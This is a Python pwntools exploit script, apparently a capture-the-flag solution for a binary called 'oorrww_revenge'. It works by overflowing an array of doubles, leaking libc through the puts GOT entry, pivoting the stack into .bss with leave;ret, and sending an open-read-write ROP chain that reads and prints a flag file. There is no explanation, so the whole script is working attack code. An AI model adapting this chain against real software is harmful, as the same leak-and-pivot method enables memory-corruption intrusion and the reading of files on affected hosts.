from pwn import *
context(log_level='debug', arch='x86', terminal=['tmux', 'splitw', '-h'])

io = process("./oorrww_revenge")
elf = ELF("./oorrww_revenge")
libc = ELF("./libc.so.6")

ret = 0x40101a
leave_ret = 0x401280
pop_rax = 0x401203
bss_addr = 0x404400
puts_text1 = 0x4012da
puts_plt = elf.plt[b"puts"]
puts_got = elf.got[b"puts"]


def double_float(value):
    return str(struct.unpack("!d", p64(value)[::-1])[0])


def double_to_hex(val):
    return int.from_bytes(struct.pack("d", val), "little")


for i in range(21):
    io.sendlineafter(b"input:\n", b"-")

payload = [double_float(pop_rax), double_float(puts_got), double_float(puts_text1),  double_float(ret), double_float(ret), double_float(ret), double_float(
    ret), double_float(ret), double_float(0x401110)]

for i in range(len(payload)):
    io.sendlineafter(b"input:\n", payload[i])

leak_addr = u64(io.recv(6).ljust(8, b"\x00"))-libc.sym[b"puts"]
log.success("leak_addr: "+hex(leak_addr))

pop_rdi = leak_addr+0x2a3e5
pop_rsi = leak_addr+0x16333a
leave_ret = leak_addr+0x4da83
pop_rdx_rbx = leak_addr+0x904a9

open_a = leak_addr+libc.sym[b"open"]
read_a = leak_addr+libc.sym[b"read"]
write_a = leak_addr+libc.sym[b"write"]

for i in range(20):
    io.sendlineafter(b"input:\n", b"-")


io.sendlineafter(b"input:\n", double_float(bss_addr))


payload = [double_float(pop_rdi), double_float(0x0), double_float(pop_rsi), double_float(
    bss_addr), double_float(pop_rdx_rbx), double_float(0x200), double_float(0x200), double_float(read_a), double_float(leave_ret)]

for i in range(len(payload)):
    io.sendlineafter(b"input:\n", payload[i])

orw = flat(
    p64(0), p64(pop_rdi), p64(
        bss_addr+0x98), p64(pop_rsi), p64(0), p64(open_a),
    p64(pop_rdi), p64(3), p64(pop_rsi), p64(bss_addr+0x200), p64(
        pop_rdx_rbx), p64(0x50), p64(0x50), p64(read_a),
    p64(pop_rdi), p64(2), p64(
        pop_rsi), p64(bss_addr+0x200), p64(write_a), p64(0x7478742e67616c66)
)

io.send(orw)

io.interactive()
